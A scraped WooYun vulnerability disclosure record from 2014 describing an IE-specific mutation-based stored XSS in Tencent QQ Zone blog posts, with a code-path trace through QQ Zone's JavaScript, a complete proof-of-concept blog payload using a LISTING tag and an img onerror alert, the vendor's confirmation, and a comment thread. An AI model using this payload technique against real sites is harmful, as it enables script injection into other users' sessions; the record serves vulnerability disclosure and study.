{"id": 5025, "wybug_id": "wooyun-2014-051536", "wybug_title": "QQ空间某功能缺陷导致日志存储型XSS - 15", "wybug_corp": "腾讯", "wybug_author": "gainover", "wybug_date": "2014-02-20 16:43", "wybug_open_date": "2014-04-06 16:43", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "类型应用", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-06：\t细节向公众公开  简要描述： 一枚mXSS（来自老外的叫法），算是比较新鲜的玩意。。 详细说明：  首先声明这是一个IE特异的XSS问题。为了理解这个问题，首先看下面的代码：\n<div id=\"testa\">xx</div><div id=\"testb\">xx</div><script>var m=\"<LISTING>&lt;img src=x onerror=alert(1)&gt;</LISTING>\";var x=document.getElementById(\"testa\");x.innerHTML=m;var html=x.innerHTML;alert(html); //弹出 <LISTING><img src=x onerror=alert(1)></LISTING>document.getElementById(\"testb\").innerHTML = html;</script>\n可以看出 <LISTING>&lt;img src=x onerror=alert(1)&gt;</LISTING> 是一段无害的代码，但是进入x的innerHTML后，再取出x的innerHTML时，变成了有害的HTML代码<LISTING><img src=x onerror=alert(1)></LISTING>当这个有害的代码再次进入其它元素的innerHTML时，就会触发XSS。------------------------------为了利用上面这种情况，我们需要假想以下流程。\n\n看起来有点繁琐，那么是否可以找到这样的场景呢？这里我就拿QQ空间日志为例（对QQ空间的JS代码熟悉点。。）1. 我们选择模板日志进行发布日志，在日志内容里插入上面提到的那段代码：\n<LISTING>&lt;img src=x onerror=alert(1)&gt;</LISTING>\n看返回的日志内容得出结论是：腾讯的过滤器并不会过滤listing标签。2. 第一步是前提，接着我们就要找 innerHTML的一进一出。这里我定位到/qzone/app/blog/v6/script/blog_content.js中的Title.parse\nTitle.parse = function(content) {    var result = [];    var contentContainer = document.createElement(\"div\");    contentContainer.innerHTML = content;    var titleArr = content.match(/<div[^>]*?name=\"title\"[\\s|\\S]*?\\/div>/ig);    if ( !! titleArr && titleArr.length > 0) {        for (var i = 0, j = titleArr.length; i < j; i++) {            var textDiv = document.createElement(\"div\");            textDiv.innerHTML = titleArr[i];            result.push(textDiv.childNodes[0]);        }    }    return result;}\n在这段代码中，content是我们可控的日志内容，titleArr是正则匹配后的结果，也是我们可控的内容。接着在for循环中，可以看到titleArr的内容进入了 textDiv.innerHTML，这正是我们上面所绘制步骤中的第一步。这些textDiv的子节点被push到result数组中返回。3. 我们看看Title.parse的返回值去了哪里？相关代码如下：\n... TemplateBlogParser.titles = Title.parse(content);...\n4. 继续跟踪 .titles  ，\ncase \"Title\":\tif (TemplateBlogParser.titles.length == 0) {\t\tbreak;\t}\tvar title = TemplateBlogParser.titles.shift();\tif (title.innerHTML != \"\") {\t\taData.content = title.innerHTML;\t}\tbreak;\n我们可以看到title.innerHTML被取出放入到了 aData.content 变量中。这样一来，就完成了我们所绘步骤图中的第二步。5. 希望就在前方，我们要继续看这个 aData.content是否会进入 innerHTML而输出到DOM中。最后输出到页面中的是 TemplateBlogParser.parse 函数的返回值，而该函数的返回值来自以下代码：\ncase \"view\":\treturn aObj.getContentHTML();\tbreak;\n因为我们是利用的Title, 其中aObj对应的是Title \"类\"，我们查看Title的getContentHTML函数。\nTitle.prototype.getContentHTML = function() {    var html = ['<div class=\"blog_module_tit\">', this.data.content, '</div>'].join(\"\");    return html;}\n可以看到，我们的data.content被join拼接并返回，回溯来看，最终到达TemplateBlogParser.parse的返回值中。而该返回值，最终使用以下代码，进入innerHTML.\n//g_oBlogContent 中包含有我们的代码g_oContentDom.innerHTML = g_oBlogContent;\n6. 因此，我们可以简单的构造利用代码如下：\n<div class=\"blog_details_20120222\"><div name=\"title\">xxxxxxx</div><div name=\"title\"><LISTING>&lt;img src=x onerror=alert(22)&gt;</LISTING> </div><div name=\"text\" style=\"font-size:14px\">bbbbbbb</div><img name=\"pic\" style=\"display:block;\" width=\"200\" height=\"200\" alt=\"图片\" position=\"0_0\" isDefaultPhoto=\"1\" rotation=\"0\" scale=\"0\" src=\"http://edu.qzs.qq.com/qzone/space_item/orig/10/97754/module_1.jpg\" /><div name=\"title\">ccccc</div><div name=\"text\" style=\"font-size:14px\">cccccc</div><img name=\"pic\" style=\"display:block;\" width=\"200\" height=\"200\" alt=\"图片\" position=\"0_0\" isDefaultPhoto=\"1\" rotation=\"0\" scale=\"0\" src=\"http://edu.qzs.qq.com/qzone/space_item/orig/10/97754/module_2.jpg\" /><div name=\"title\">ddddddd</div><div name=\"text\" style=\"font-size:14px\">dddddd</div><img name=\"pic\" style=\"display:block;\" width=\"200\" height=\"200\" alt=\"图片\" position=\"0_0\" isDefaultPhoto=\"1\" rotation=\"0\" scale=\"0\" src=\"http://edu.qzs.qq.com/qzone/space_item/orig/10/97754/module_3.jpg\" /><div name=\"MultiImageController\" data=\"\"></div><div name=\"music\" data=\"undefined|||\"><object style=\"display:none\" ubb=\"undefined|||\" class=\"blog_music none\"></object></div></div>\n效果见漏洞证明。   漏洞证明：  win7 + ie8\n\n   修复方案：  考虑过滤 listing 标签，不过可能会有点治标不治本。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-02-21 15:01 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-20 16:45 |    \t\tqwerty \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:16        | 已注销)\t\t \n  沙发    \n     2014-02-20 16:46 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  这么快~     \n     2014-02-20 16:48 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  gainover导演又出新剧本了，场场精彩    \n     2014-02-20 16:48 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  坐等一百集大结局    \n     2014-02-20 16:48 |    \t\tFocusstart \t\t\t( 普通白帽子  |\t\t\t        Rank:574 漏洞数:163        | 努力让某某某成为最幸福的女人！)\t\t \n  叼炸天~    \n     2014-02-20 16:49 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  .....老二，好久不见啊    \n     2014-02-20 16:51 |    \t\tblackexp \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:13        | 一点一点的渗透到...)\t\t \n  二老是不是把这些都写出exp，然后扫扫就出来洞啦。。。产量如此高    \n     2014-02-20 17:09 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  坐等大作！    \n     2014-02-20 17:35 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  不是不想关注啊，着实看不懂的努力支持一个    \n     2014-02-20 18:01 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  果断跟随    \n     2014-02-20 18:53 |    \t\tvipons \t\t\t( 普通白帽子  |\t\t\t        Rank:284 漏洞数:65        | *^◎^*)\t\t \n  你咋提交了  我还没玩够呢    \n     2014-02-20 19:07 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @蟋蟀哥哥 忙。。 = =     \n     2014-02-20 19:22 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  二哥~    \n     2014-02-20 22:00 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  mXSS竟然没百度搜索到相关的解释    \n     2014-02-21 08:46 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover m的全拼是啥？？忙学校的事，还是忙啥呢    \n     2014-02-21 09:57 |    \t\tqwerty \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:16        | 已注销)\t\t \n  @蟋蟀哥哥 好像是Mutation-based Cross-Site-Scripting    \n     2014-02-21 10:08 |    \t\tIvan \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:9        | 小菜逼一个)\t\t \n  关注下    \n     2014-02-21 10:58 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @qwerty thx    \n     2014-02-21 11:10 |    \t\tUndoit \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:25        | 打酱油)\t\t \n  怎么这么屌    \n     2014-02-21 14:19 |    \t\tHRay \t\t\t( 普通白帽子  |\t\t\t        Rank:196 漏洞数:28        | 018)\t\t \n  上网找关于mxss的pdf，其中一个还提到了http://html5sec.org/?xmlns#97,看来很多wsl都在关注这个站点    \n     2014-02-21 14:22 |    \t\tHRay \t\t\t( 普通白帽子  |\t\t\t        Rank:196 漏洞数:28        | 018)\t\t \n  http://www.cse.chalmers.se/~d02pulse/thesis/innerhtml.pdf顺便把pdf地址发出来，大家感兴趣的可以看下    \n     2014-02-21 18:28 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  QQ空间存在很多的XSS，只不过很隐蔽~洞主多挖挖吧~    \n     2014-02-21 20:36 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  漂亮    \n     2014-02-21 20:40 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @HRay 感谢PDF的分享    \n     2014-02-21 20:44 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  @HRay 感谢PDF分享~    \n     2014-04-07 12:46 |    \t\t影子契约 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 额额。。。)\t\t \n  分析够彻底。。。。    \n     2014-09-20 19:49 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  大牛的 挖掘的洞虽然都看不懂 ，但感觉很厉害的样子 ，一直看下去......    \n     2015-04-30 12:10 |    \t\t小天 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:30        | 热爱学习，热爱web，热爱漏洞，热爱挖掘，)\t\t \n  好崇拜    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}